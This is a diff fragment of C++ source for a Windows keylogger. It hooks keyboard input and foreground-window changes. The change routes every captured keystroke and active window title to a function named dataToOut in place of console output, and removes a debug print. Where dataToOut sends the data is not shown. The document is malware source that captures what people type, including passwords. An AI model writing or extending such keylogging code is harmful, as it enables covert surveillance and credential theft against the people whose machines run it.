@@ -12,7 +12,7 @@ LRESULT CALLBACK logKeyPresses(int nCode, WPARAM wParam, LPARAM lParam)
 	{
 		char currKey = p->vkCode;
 		std::string pressedKey = KeyLogger::returnChar(currKey);
-		std::cout << pressedKey << std::endl;
+		KeyLogger::dataToOut(pressedKey);
 	}
 	
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
@@ -36,6 +36,7 @@ VOID CALLBACK logForegroundWindow
 		HWND newWin = (HWND)hwnd;
 		// LPSTR = long pointer to string
 		std::string newWindow = KeyLogger::returnForegroundWindow(newWin);
+		KeyLogger::dataToOut(newWindow);
 	}
 }
 
@@ -76,6 +77,5 @@ int main()
 	while (GetMessage(&msg, NULL, 0, 0) != 0) {
 		//when keys are being pressed
 		UnhookWindowsHookEx(kboardHook);
-		std::cout << "key pressed" << std::endl;
 	}
 }
